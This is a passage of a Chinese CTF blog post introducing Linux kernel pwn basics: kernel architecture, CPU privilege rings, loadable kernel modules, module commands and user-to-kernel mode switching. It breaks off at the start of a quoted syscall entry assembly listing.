<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="韩乔落">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set data attribute for CSS variables
                root.setAttribute("data-theme", theme);
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes once DOM is ready
            if (document.readyState !== "loading") {
                document.body.classList.add(theme + "-mode");
            } else {
                document.addEventListener("DOMContentLoaded", () => {
                    document.body.classList.add(theme + "-mode");
                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
                });
            }
        })();
    </script>
    
    <!-- Critical CSS to prevent flash -->
    <style>
        :root[data-theme="dark"] {
            --background-color: #202124;
            --background-color-transparent: rgba(32, 33, 36, 0.6);
            --second-background-color: #2d2e32;
            --third-background-color: #34353a;
            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #ffffff;
            --second-text-color: #eeeeee;
            --third-text-color: #bebec6;
            --fourth-text-color: #999999;
            --default-text-color: #bebec6;
            --invert-text-color: #373D3F;
            --border-color: rgba(255, 255, 255, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(255, 255, 255, 0.08);
            --shadow-color-2: rgba(255, 255, 255, 0.05);
        }
        
        :root[data-theme="light"] {
            --background-color: #fff;
            --background-color-transparent: rgba(255, 255, 255, 0.6);
            --second-background-color: #f8f8f8;
            --third-background-color: #f2f2f2;
            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #16171a;
            --second-text-color: #2f3037;
            --third-text-color: #5e5e5e;
            --fourth-text-color: #eeeeee;
            --default-text-color: #373D3F;
            --invert-text-color: #bebec6;
            --border-color: rgba(0, 0, 0, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(0, 0, 0, 0.08);
            --shadow-color-2: rgba(0, 0, 0, 0.05);
        }
        
        body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
        
        /* Apply body classes as soon as DOM is ready */
        :root[data-theme="dark"] body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
    </style>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
        
        
        
    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://jelasin.github.io/2025/12/15/深入理解pwn_kernel基础篇/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
        
        <meta name="description" content="会当身由己，婉转入江湖">
<meta property="og:type" content="article">
<meta property="og:title" content="深入理解Pwn_Kernel基础篇">
<meta property="og:url" content="https://jelasin.github.io/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/index.html">
<meta property="og:site_name" content="Jelasin">
<meta property="og:description" content="会当身由己，婉转入江湖">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://jelasin.github.io/images/touxiang.jpg">
<meta property="article:published_time" content="2025-12-15T06:36:16.000Z">
<meta property="article:modified_time" content="2026-01-19T05:40:38.233Z">
<meta property="article:author" content="Jelasin">
<meta property="article:tag" content="Pwn_Kernel">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://jelasin.github.io/images/touxiang.jpg">
    
    
        <!-- Google tag (gtag.js) -->
        <script src="https://www.googletagmanager.com/gtag/js?id=G-3333333333"></script>
        <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-3333333333');
        </script>
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/favicon.ico" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/favicon.ico">
    <!--- Page Info-->
    
    <title>
        
            深入理解Pwn_Kernel基础篇 | Jelasin
        
    </title>

    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fonts/Chillax/chillax.css">

    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/css/build/tailwind.css">
    

    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fonts/GeistMono/geist-mono.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fonts/Geist/geist.css">
    <!--- Font Part-->
    
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"jelasin.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"},"english":{"enable":false,"family":"Farsan","url":"https://fonts.googleapis.com/css2?family=Farsan&display=swap"},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":false,"site_uv":false,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/touxiang.jpg","description":"会当身由己，婉转入江湖"},"google_analytics":{"enable":true,"id":"G-3333333333"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"“会当身由己，婉转入江湖”","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":null,"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"About":{"icon":"fa-regular fa-user","submenus":{"kanxue":"https://bbs.kanxue.com/homepage-958172.htm","Github":"https://github.com/jelasin","中国诗歌网":"https://www.zgshige.com/c/2022-04-13/21151100.shtml"}}},"search":{"enable":true,"preload":false}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"AI":{"path":"/AI","icon":"fa-brands fa-python"},"IOT":{"path":"/IOT","icon":"fas fa-network-wired"},"CTF":{"path":"/CTF","icon":"fa-solid fa-snowflake"},"Web":{"path":"/Web","icon":"fa-solid fa-shield"},"Linux":{"path":"/Linux","icon":"fa-brands fa-linux"},"Android":{"path":"/Android","icon":"fa-brands fa-android"},"Windows":{"path":"/Windows","icon":"fa-brands fa-windows"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":4},"tags":{"enable":true,"limit":4}},"footerStart":"2023/9/20 11:45:14"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fontawesome/fontawesome.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fontawesome/brands.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fontawesome/solid.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fontawesome/regular.min.css">
    
    
    
    
<meta name="generator" content="Hexo 6.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
                    <img src="/images/favicon.ico" class="w-full h-full rounded-xs">
                </a>
            
            <a class="logo-title" href="/">
                
                Jelasin
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    ARCHIVES
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown"
                                   href="#"
                                        onClick=&#34;return false;&#34;>
                                    <i class="fa-regular fa-user fa-fw"></i>
                                    ABOUT
                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
                                </a>

                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/homepage-958172.htm">
                                                    KANXUE
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://github.com/jelasin">
                                                    GITHUB
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://www.zgshige.com/c/2022-04-13/21151100.shtml">
                                                    中国诗歌网
                                                </a>
                                            </li>
                                        
                                    </ul>
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/archives"
                        >
                            <span>
                                ARCHIVES
                            </span>
                            
                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
                        
                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                             navbar-data-toggle="submenu-About"
                        >
                            <span>
                                ABOUT
                            </span>
                            
                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
                            
                        </div>
                        

                        
                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://bbs.kanxue.com/homepage-958172.htm">KANXUE</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://github.com/jelasin">GITHUB</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://www.zgshige.com/c/2022-04-13/21151100.shtml">中国诗歌网</a>
                                    </div>
                                
                            </div>
                        
                    </li>
            

            
            
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/AI"
                        >
                            <span>AI</span>
                            <i class="fa-brands fa-python fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/IOT"
                        >
                            <span>IOT</span>
                            <i class="fas fa-network-wired fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/CTF"
                        >
                            <span>CTF</span>
                            <i class="fa-solid fa-snowflake fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Web"
                        >
                            <span>Web</span>
                            <i class="fa-solid fa-shield fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Linux"
                        >
                            <span>Linux</span>
                            <i class="fa-brands fa-linux fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Android"
                        >
                            <span>Android</span>
                            <i class="fa-brands fa-android fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Windows"
                        >
                            <span>Windows</span>
                            <i class="fa-brands fa-windows fa-sm fa-fw"></i>
                        </a>
                    </li>
                
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">38</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">17</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">171</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">深入理解Pwn_Kernel基础篇</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/touxiang.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">韩乔落</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-12-15 14:36:16</span>
        <span class="mobile">2025-12-15 14:36:16</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2026-01-19 13:40:38</span>
            <span class="mobile">2026-01-19 13:40:38</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/CTF/">CTF</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/Pwn-Kernel/">Pwn_Kernel</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>原《深入理解Pwn_Kernel及其相关例题》编辑起来太卡了。这里把基础部分分在这里。</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/jelasin/Linux_kernel_exploit" >附件地址<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>最近重新跟着老师学了一遍Linux内核安全，所以从博客里翻出来这个古老的文章做一些翻新和添油加醋，但内容依然有很多不足，文章结构也比较混乱，后续会进行改进。这里做的是 Linux Kernel pwn 一些利用手法的记录，后面如果学到 Windows kernel pwn会另开一个篇章。篇幅有限，后面一些内容再做补充。本文内容适合入门学习。还有一些内容有时间再写……</p>
<p><a href="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/">深入理解Pwn_heap及相关赛题</a></p>
<p><a href="https://jelasin.github.io/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/">深入理解Pwn_IO_FILE及相关赛题</a></p>
<p>主要参考:</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/environment/readme/" >ctf-wiki<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>推荐一个适合学习<code>linux kernel</code>开源项目<a class="link"   target="_blank" rel="noopener" href="https://github.com/0voice/linux_kernel_wiki#1" >linux_kernel_wiki<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。这部分的基础知识是很简单的介绍，后门会对内核相关的基础知识新开篇章进行略详细的学习。</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.kernelconfig.io/index.html" >kernel config search<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="内核简介"><a href="#内核简介" class="headerlink" title="内核简介"></a>内核简介</h2><p>通常来说我们可以把内核架构分为两种：宏内核和微内核，此外还有混合内核，外内核。<code>kernel</code> 也是一个程序，用来管理软件发出的数据 <code>I/O</code> 要求，将这些要求转义为指令，交给 <code>CPU</code> 和计算机中的其他组件处理，<code>kernel</code> 是现代操作系统最基本的部分。</p>
<p><code>kernel</code> 最主要的功能有两点：</p>
<ul>
<li>控制并与硬件进行交互</li>
<li>提供 <code>application</code> 能运行的环境</li>
</ul>
<p>包括 <code>I/O</code>，权限控制，系统调用，进程管理，内存管理等多项功能都可以归结到上边两点中。需要注意的是，<code>kernel</code> 的 <code>crash</code> 通常会引起重启。<code>linux</code>内核采用的是单内核结构，效率高，但是体积大。<code>Linux</code> 内核包含系统调用接口，进程管理，内存管理，文件系统，网络管理，设备驱动。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/kernel_cap.jpg"
                      alt="kernel_cap"
                ></p>
<h2 id="Ring-Model"><a href="#Ring-Model" class="headerlink" title="Ring Model"></a>Ring Model</h2><p><code>intel CPU</code> 将 <code>CPU</code> 的特权级别分为 4 个级别：<code>Ring0</code>, <code> Ring1</code>, <code>Ring2</code>, <code>Ring3</code>。大多数的现代操作系统只使用 <code>Ring0</code> 和 <code>Ring3</code>。</p>
<ul>
<li>内核空间运行在 <code>Ring0</code> 特权等级，拥有自己的空间，位于内存的高地址。</li>
<li>用户空间则是我们平时应用程序运行的空间，运行在 <code>Ring3</code> 特权等级，使用较低地址。</li>
<li><code>Ring0</code> 只给 <code>OS</code> 使用，<code>Ring3</code> 所有程序都可以使用，内层 <code>Ring</code> 可以随便使用外层 <code>Ring</code> 的资源。</li>
</ul>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/RingModel.png"
                      alt="RingModel"
                ></p>
<h2 id="Loadable-Kernel-Modules-LKMs"><a href="#Loadable-Kernel-Modules-LKMs" class="headerlink" title="Loadable Kernel Modules(LKMs)"></a>Loadable Kernel Modules(LKMs)</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a><strong>概述</strong></h3><p>可加载核心模块 (或直接称为内核模块) 就像运行在内核空间的可执行程序，LKMs 的文件格式和用户态的可执行程序(ELF)相同。包括:</p>
<ul>
<li>驱动程序（Device drivers）<ul>
<li>设备驱动</li>
<li>文件系统驱动</li>
<li>…</li>
</ul>
</li>
<li>内核扩展模块 (modules)</li>
</ul>
<p>模块可以被单独编译，但不能单独运行。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户控件的进程不同。模块通常用来实现一种文件系统、一个驱动程序或者其他内核上层的功能。Linux 内核之所以提供模块机制，是因为它本身是一个单内核 (monolithic kernel)。单内核的优点是效率高，因为所有的内容都集合在一起，但缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。</p>
<h3 id="相关指令"><a href="#相关指令" class="headerlink" title="相关指令"></a><strong>相关指令</strong></h3><ul>
<li><code>insmod</code>: 讲指定模块加载到内核中</li>
<li><code>rmmod</code>: 从内核中卸载指定模块</li>
<li><code>lsmod</code>: 列出已经加载的模块</li>
<li><code>modprobe</code>: 添加或删除模块，<code>modprobe</code> 在加载模块时会查找依赖关系</li>
</ul>
<p>大多数<code>CTF</code>中的 <code>kernel vulnerability</code> 也出现在 <code>LKM</code> 中。</p>
<h3 id="用户态-内核态"><a href="#用户态-内核态" class="headerlink" title="用户态-&gt;内核态"></a><strong>用户态-&gt;内核态</strong></h3><p><strong>切换条件</strong></p>
<p>当发生 系统调用，产生异常，外设产生中断等事件时，会发生用户态到内核态的切换。</p>
<ul>
<li>系统调用(软中断)：</li>
</ul>
<p>系统调用，指的是用户空间的程序向操作系统内核请求需要更高权限的服务，比如 IO 操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数（如 scanf，puts 等 IO 相关的函数实际上是对系统调用的封装（read 和 write））。</p>
<blockquote>
<p>64bit 系统调用编号<br><code>cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep __NR_</code><br>32bit 系统调用编号<br><code>cat /usr/include/asm/unistd_32.h | grep __NR_</code></p>
</blockquote>
<ul>
<li>外设中断(硬中断)：当外围设备完成用户的请求操作后，会像CPU发出中断信号，此时，CPU就会暂停执行下一条即将要执行的指令，转而去执行中断信号对应的处理程序，如果先前执行的指令是在用户态下，则自然就发生从用户态到内核态的转换。</li>
<li>异常：当CPU正在执行运行在用户态的程序时，突然发生某些预先不可知的异常事件，这个时候就会触发从当前用户态执行的进程转向内核态执行相关的异常事件，最典型的就是缺页异常。</li>
</ul>
<p><strong>具体过程：</strong></p>
<ol>
<li>通过 <code>swapgs</code> 切换 GS 段寄存器，在中断或异常处理的entry代码处, 会执行SWAPGS切换到kernel GS, GS.base 是存储了中断stack 的地址。将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。</li>
<li>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp&#x2F;esp。</li>
<li>通过 push 保存各寄存器值，具体的 <a class="link"   target="_blank" rel="noopener" href="http://elixir.free-electrons.com/linux/v4.12/source/arch/x86/entry/entry_64.S" >代码<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 如下:</li>
</ol>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ENTRY</span>(entry_SYSCALL_64)</span><br><span class="line"><span class="comment">/* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 